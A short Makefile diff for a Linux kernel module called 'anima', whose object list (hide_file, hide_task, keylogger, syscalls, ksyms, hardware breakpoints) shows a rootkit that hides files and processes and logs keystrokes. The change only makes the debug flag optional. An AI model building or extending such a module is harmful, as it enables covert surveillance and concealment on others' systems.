@@ -2,7 +2,7 @@ obj-m += anima.o
 anima-objs := init.o debug.o hide_file.o hide_task.o keylogger.o ksyms.o libc.o syscalls.o vfs.o
 
 DIE_CHAIN = $(shell awk '/die_chain/ { print $$1 }' /boot/System.map-`uname -r`||echo 0)
-EXTRA_CFLAGS = -std=gnu99 -I$(PWD)/../include -DDEBUG -DCOMPILE_TIME_DIE_CHAIN=0x$(DIE_CHAIN)
+EXTRA_CFLAGS = -std=gnu99 -I$(PWD)/../include -DCOMPILE_TIME_DIE_CHAIN=0x$(DIE_CHAIN)
 
 ifeq ($(ARCH), arm)
 	anima-objs += arm_hw_breakpoint.o arm_utils.o
@@ -12,6 +12,10 @@ endif
 ifeq ($(ARCH), x86)
 	anima-objs += x86_hw_breakpoint.o x86_utils.o
 	EXTRA_CFLAGS += -DARCH_X86
+endif
+
+ifeq ($(DEBUG), 1)
+	EXTRA_CFLAGS += -DDEBUG
 endif
 
 all:
